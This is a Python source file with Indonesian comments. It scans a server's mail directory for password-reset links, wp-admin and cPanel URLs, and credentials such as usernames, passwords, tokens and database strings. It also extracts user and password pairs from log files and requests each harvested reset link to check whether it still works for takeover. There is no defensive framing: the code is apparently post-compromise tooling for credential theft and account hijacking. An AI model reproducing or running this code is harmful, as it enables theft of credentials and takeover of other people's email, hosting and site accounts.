# ========== SCAN EMAIL ==========
def extract_email_content(filepath):
    """Baca dan ekstrak isi email"""
    try:
        with open(filepath, 'rb') as f:
            msg = BytesParser(policy=policy.default).parse(f)
            subject = msg.get('subject', 'No Subject')
            from_ = msg.get('from', 'No From')
            to = msg.get('to', 'No To')
            date = msg.get('date', 'No Date')
            
            body = ""
            if msg.is_multipart():
                for part in msg.walk():
                    if part.get_content_type() == "text/plain":
                        body = part.get_content()
                        break
            else:
                body = msg.get_content()
            
            return {
                'subject': subject,
                'from': from_,
                'to': to,
                'date': date,
                'body': body,
                'full_text': f"{subject}\n{from_}\n{to}\n{body}"
            }
    except:
        return None

def scan_mail_for_reset(mail_path):
    """Scan direktori mail untuk cari link reset password & credential"""
    results = {
        'reset_links': [],
        'credentials': [],
        'emails': []
    }
    
    file_count = 0
    for root, dirs, files in os.walk(mail_path):
        for file in files:
            # SKIP FILE SYSTEM
            if file.startswith('.'):
                continue
            
            filepath = os.path.join(root, file)
            file_count += 1
            
            # BACA EMAIL
            email_data = extract_email_content(filepath)
            if not email_data:
                continue
            
            text = email_data['full_text']
            
            # CARI LINK RESET
            reset_patterns = [
                r'https?://[^\s"\']*(reset|changepw|recover|forgot|password|setpass)[^\s"\']*',
                r'https?://[^\s"\']*\?(?:[^"\']*)(?:login|user|email|key|token|code|hash)=[^\s"\']*',
                r'https?://[^\s"\']*\/wp-admin\/[^\s"\']*',
                r'https?://[^\s"\']*\/cpanel[^\s"\']*',
            ]
            
            for pattern in reset_patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        results['reset_links'].append({
                            'link': match,
                            'file': filepath,
                            'subject': email_data['subject']
                        })
            
            # CARI CREDENTIAL
            cred_patterns = [
                (r'(?:username|user|login|email)[\s:=]+([^\s"\']+)', 'username'),
                (r'(?:password|pass|pwd)[\s:=]+([^\s"\']+)', 'password'),
                (r'(?:secret|api[_-]?key|token)[\s:=]+([^\s"\']+)', 'token'),
                (r'(?:mysql|database|db)[\s:=]+([^\s"\']+)', 'database'),
            ]
            
            for pattern, cred_type in cred_patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        results['credentials'].append({
                            'type': cred_type,
                            'value': match,
                            'file': filepath,
                            'subject': email_data['subject']
                        })
            
            # SIMPAN EMAIL YANG BERISI CREDENTIAL/RESET
            if results['reset_links'] or results['credentials']:
                results['emails'].append({
                    'file': filepath,
                    'subject': email_data['subject'],
                    'from': email_data['from'],
                    'to': email_data['to'],
                    'date': email_data['date'],
                    'body_preview': email_data['body'][:500] + "..."
                })
    
    print(f"[+] Total files scanned: {file_count}")
    return results

# ========== EKSTRAK LOG ==========
def extract_login_creds(log_path):
    """Ekstrak user/password dari log"""
    creds = []
    try:
        with open(log_path, "r", errors="ignore") as f:
            for line in f:
                # LOGIN LOG
                if "password" in line.lower() or "pass" in line.lower():
                    user_match = re.search(r'(?:user|login|username)[=:]\s*([^\s]+)', line, re.IGNORECASE)
                    pass_match = re.search(r'(?:pass|password|pwd)[=:]\s*([^\s]+)', line, re.IGNORECASE)
                    if user_match and pass_match:
                        creds.append({
                            'user': user_match.group(1),
                            'pass': pass_match.group(1),
                            'source': log_path
                        })
                
                # IP & USER
                if "login" in line.lower():
                    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    user_match = re.search(r'user[=:]\s*([^\s]+)', line, re.IGNORECASE)
                    if ip_match and user_match:
                        creds.append({
                            'ip': ip_match.group(1),
                            'user': user_match.group(1),
                            'source': log_path
                        })
    except:
        pass
    return creds

# ========== VALIDASI LINK ==========
def validate_reset_links(links):
    """Cek apakah link reset masih aktif/valid"""
    valid_links = []
    
    for item in links:
        try:
            resp = requests.get(item['link'], timeout=10, allow_redirects=True)
            if resp.status_code == 200:
                # CEK APAKAH LINK MASIH VALID (bukan error page)
                if "invalid" not in resp.text.lower() and "expired" not in resp.text.lower():
                    item['status'] = 'VALID'
                    valid_links.append(item)
                else:
                    item['status'] = 'EXPIRED'
            else:
                item['status'] = f'ERROR {resp.status_code}'
        except:
            item['status'] = 'TIMEOUT'
    
    return valid_links

